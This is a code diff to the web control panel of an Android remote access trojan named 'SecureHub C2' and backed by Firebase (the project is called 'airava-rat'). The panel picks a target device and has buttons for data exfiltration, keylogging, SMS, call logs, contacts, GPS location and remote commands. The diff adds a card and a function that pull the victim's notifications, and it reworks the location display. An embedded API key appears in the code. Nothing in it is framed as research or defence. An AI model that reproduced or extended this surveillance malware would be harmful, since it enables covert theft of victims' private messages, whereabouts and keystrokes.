@@ -21,7 +21,6 @@
             min-height: 100vh;
         }
 
-        /* Glassmorphism Navbar */
         .navbar {
             background: rgba(10, 14, 39, 0.95);
             backdrop-filter: blur(10px);
@@ -87,14 +86,12 @@
             margin-left: 5px;
         }
 
-        /* Main Container */
         .container {
             max-width: 1400px;
             margin: 0 auto;
             padding: 20px 30px;
         }
 
-        /* Device Selector Card */
         .device-card {
             background: rgba(26, 30, 63, 0.8);
             backdrop-filter: blur(10px);
@@ -183,7 +180,6 @@
             50% { opacity: 0.5; }
         }
 
-        /* Grid Layout */
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
@@ -191,7 +187,6 @@
             margin-bottom: 25px;
         }
 
-        /* Cards */
         .card {
             background: rgba(26, 30, 63, 0.8);
             backdrop-filter: blur(10px);
@@ -220,7 +215,6 @@
             padding: 20px;
         }
 
-        /* Button Groups */
         .button-group {
             display: flex;
             flex-wrap: wrap;
@@ -235,7 +229,6 @@
             padding: 8px 12px;
         }
 
-        /* Data Boxes */
         .data-box {
             background: #0a0e27;
             border-radius: 12px;
@@ -273,39 +266,6 @@
             margin-top: 5px;
         }
 
-        /* Chat/Messaging Interface */
-        .chat-container {
-            background: #0a0e27;
-            border-radius: 12px;
-            height: 250px;
-            overflow-y: auto;
-            padding: 15px;
-        }
-
-        .chat-message {
-            margin-bottom: 12px;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .chat-message.sent {
-            align-items: flex-end;
-        }
-
-        .chat-bubble {
-            background: rgba(0, 255, 204, 0.1);
-            padding: 8px 12px;
-            border-radius: 12px;
-            max-width: 80%;
-            font-size: 12px;
-        }
-
-        .chat-message.sent .chat-bubble {
-            background: rgba(0, 255, 204, 0.2);
-            color: #00ffcc;
-        }
-
-        /* Progress Bar */
         .progress-bar {
             height: 4px;
             background: rgba(0, 255, 204, 0.2);
@@ -322,7 +282,6 @@
             border-radius: 2px;
         }
 
-        /* Footer */
         .footer {
             text-align: center;
             padding: 20px;
@@ -332,7 +291,6 @@
             margin-top: 20px;
         }
 
-        /* Scrollbar */
         ::-webkit-scrollbar {
             width: 6px;
         }
@@ -347,7 +305,6 @@
             border-radius: 3px;
         }
 
-        /* Responsive */
         @media (max-width: 768px) {
             .container {
                 padding: 15px;
@@ -361,7 +318,6 @@
             }
         }
 
-        /* Loading Animation */
         .loader {
             display: inline-block;
             width: 20px;
@@ -397,7 +353,6 @@
     </nav>
 
     <div class="container">
-        <!-- Device Selection Card -->
         <div class="device-card">
             <div class="device-selector">
                 <label>📱 SELECT TARGET DEVICE</label>
@@ -406,14 +361,11 @@
                 </select>
                 <button onclick="refreshDevices()">🔄 Refresh</button>
                 <button onclick="sendCommand('get_device_info')" class="warning">📊 Get Device Info</button>
-                <button onclick="sendCommand('get_location')" class="warning">📍 Get Location</button>
                 <div id="deviceInfo" style="margin-left: auto; font-size: 12px; color: #00ffcc;"></div>
             </div>
         </div>
 
-        <!-- Main Grid -->
         <div class="grid">
-            <!-- Data Collection Card -->
             <div class="card">
                 <div class="card-header">
                     📁 DATA EXFILTRATION
@@ -425,12 +377,10 @@
                         <button onclick="sendCommand('get_call_logs')">📞 Call Logs</button>
                         <button onclick="sendCommand('get_contacts')">📇 Contacts</button>
                         <button onclick="sendCommand('get_apps')">📱 Apps</button>
-                        <button onclick="sendCommand('get_notifications')">🔔 Notifications</button>
                     </div>
                 </div>
             </div>
 
-            <!-- Commands Card -->
             <div class="card">
                 <div class="card-header">
                     🎮 REMOTE COMMANDS
@@ -448,7 +398,6 @@
                 </div>
             </div>
 
-            <!-- Keylogger Card -->
             <div class="card">
                 <div class="card-header">
                     ⌨️ KEYLOGGER
@@ -465,7 +414,6 @@
             </div>
         </div>
 
-        <!-- SMS Section -->
         <div class="card" style="margin-bottom: 20px;">
             <div class="card-header">
                 📨 SMS MESSAGES
@@ -476,7 +424,6 @@
             </div>
         </div>
 
-        <!-- Apps Section -->
         <div class="card" style="margin-bottom: 20px;">
             <div class="card-header">
                 📱 INSTALLED APPS
@@ -491,7 +438,6 @@
             </div>
         </div>
 
-        <!-- Location Section -->
         <div class="card" style="margin-bottom: 20px;">
             <div class="card-header">
                 📍 GPS LOCATION
@@ -506,7 +452,6 @@
             </div>
         </div>
 
-        <!-- Call Logs Section -->
         <div class="card" style="margin-bottom: 20px;">
             <div class="card-header">
                 📞 CALL LOGS
@@ -517,7 +462,6 @@
             </div>
         </div>
 
-        <!-- Contacts Section -->
         <div class="card" style="margin-bottom: 20px;">
             <div class="card-header">
                 📇 CONTACTS
@@ -528,7 +472,20 @@
             </div>
         </div>
 
-        <!-- Live Activity Log -->
+        <div class="card" style="margin-bottom: 20px;">
+            <div class="card-header">
+                🔔 NOTIFICATIONS
+                <span class="status-dot" style="background: #00ffcc;"></span>
+            </div>
+            <div class="card-body">
+                <div class="button-group">
+                    <button onclick="sendCommand('get_notifications')">🔔 Get Notifications</button>
+                    <button onclick="refreshNotifications()">🔄 Refresh</button>
+                </div>
+                <div id="notificationsData" class="data-box">Click "Get Notifications" to fetch recent notifications...</div>
+            </div>
+        </div>
+
         <div class="card">
             <div class="card-header">
                 🔴 LIVE ACTIVITY LOG
@@ -542,13 +499,11 @@
             </div>
         </div>
 
-        <!-- Footer -->
         <div class="footer">
             SecureHub C2 Platform | Real-time Monitoring | Encrypted Communication
         </div>
     </div>
 
-    <!-- Modals -->
     <div id="smsModal" style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #1a1e3f; border-radius: 16px; padding: 25px; z-index: 2000; min-width: 300px; border: 1px solid #00ffcc;">
         <h3 style="color: #00ffcc; margin-bottom: 15px;">Send SMS</h3>
         <input type="text" id="smsNumber" placeholder="Phone Number" style="width: 100%; padding: 10px; margin-bottom: 10px; background: #0a0e27; border: 1px solid #00ffcc; color: #00ffcc; border-radius: 8px;">
@@ -559,7 +514,6 @@
     <div id="overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 1999;" onclick="closeAllModals()"></div>
 
     <script>
-        // Firebase Configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBFyaNb3Zaktpn0wsdtHhAfybRCSo2xInM",
             authDomain: "airava-rat.firebaseapp.com",
@@ -575,7 +529,6 @@
         let autoRefreshInterval = null;
         let eventCount = 0;
 
-        // Initialize
         refreshDevices();
         setInterval(() => { if (currentDeviceId) refreshLogs(); }, 15000);
 
@@ -609,6 +562,7 @@
                 refreshContacts();
                 refreshApps();
                 refreshLocation();
+                refreshNotifications();
                 refreshLogs();
                 refreshKeylogger();
                 if (autoRefreshInterval) clearInterval(autoRefreshInterval);
@@ -646,6 +600,7 @@
                 if (cmd === 'get_apps') refreshApps();
                 if (cmd === 'get_device_info') refreshDeviceInfo();
                 if (cmd === 'get_location') refreshLocation();
+                if (cmd === 'get_notifications') refreshNotifications();
             }, 5000);
         }
 
@@ -752,19 +707,51 @@
                 try {
                     const loc = JSON.parse(data);
                     let html = '';
-                    if (loc.location) {
-                        html = `<div class="entry">📍 Latitude: ${loc.location.lat || loc.location.latitude}<br>
-                                      📍 Longitude: ${loc.location.lng || loc.location.longitude}<br>
-                                      🎯 Accuracy: ${loc.location.accuracy || 'N/A'}m<br>
-                                      🕐 ${new Date(loc.timestamp || Date.now()).toLocaleString()}</div>`;
-                        html += `<div class="entry"><a href="https://maps.google.com/?q=${loc.location.lat || loc.location.latitude},${loc.location.lng || loc.location.longitude}" target="_blank" style="color: #00ffcc;">🗺️ Open in Google Maps</a></div>`;
-                    } else if (loc.latitude) {
+                    if (loc.latitude) {
                         html = `<div class="entry">📍 Latitude: ${loc.latitude}<br>
                                       📍 Longitude: ${loc.longitude}<br>
+                                      🎯 Accuracy: ${loc.accuracy || 'N/A'} meters<br>
                                       🕐 ${new Date(loc.timestamp || Date.now()).toLocaleString()}</div>`;
-                        html += `<div class="entry"><a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ffcc;">🗺️ Open in Google Maps</a></div>`;
+                        html += `<div class="entry"><a href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ffcc;">🗺️ Open in Google Maps</a></div>`;
+                    } else if (loc.location) {
+                        html = `<div class="entry">📍 Latitude: ${loc.location.lat || loc.location.latitude}<br>
+                                      📍 Longitude: ${loc.location.lng || loc.location.longitude}<br>
+                                      🎯 Accuracy: ${loc.location.accuracy || 'N/A'} meters<br>
+                                      🕐 ${new Date(loc.timestamp || Date.now()).toLocaleString()}</div>`;
+                        html += `<div class="entry"><a href="https://www.google.com/maps?q=${loc.location.lat || loc.location.latitude},${loc.location.lng || loc.location.longitude}" target="_blank" style="color: #00ffcc;">🗺️ Open in Google Maps</a></div>`;
                     }
                     div.innerHTML = html;
+                } catch(e) {
+                    div.innerHTML = '<div class="entry">' + escapeHtml(data.substring(0, 200)) + '</div>';
+                }
+            });
+        }
+
+        function refreshNotifications() {
+            db.ref(`responses/${currentDeviceId}/notifications`).once('value').then(s => {
+                const data = s.val();
+                const div = document.getElementById('notificationsData');
+                if (!data) { div.innerHTML = '<div class="entry">No notifications data. Click "Get Notifications" button.</div>'; return; }
+                try {
+                    const notif = JSON.parse(data);
+                    let html = '';
+                    if (notif.notifications && notif.notifications.length > 0) {
+                        notif.notifications.forEach(notification => {
+                            html += `<div class="entry">
+                                        <div class="entry-title">🔔 ${escapeHtml(notification.title || 'Notification')}</div>
+                                        <div class="entry-content">${escapeHtml(notification.text || notification.body || '')}</div>
+                                        <div class="timestamp">${escapeHtml(notification.packageName || 'Unknown App')}</div>
+                                    </div>`;
+                        });
+                    } else if (Array.isArray(notif)) {
+                        notif.forEach(notification => {
+                            html += `<div class="entry">
+                                        <div class="entry-title">🔔 Notification</div>
+                                        <div class="entry-content">${escapeHtml(notification)}</div>
+                                    </div>`;
+                        });
+                    }
+                    div.innerHTML = html || '<div class="entry">No notifications found</div>';
                 } catch(e) {
                     div.innerHTML = '<div class="entry">' + escapeHtml(data.substring(0, 200)) + '</div>';
                 }
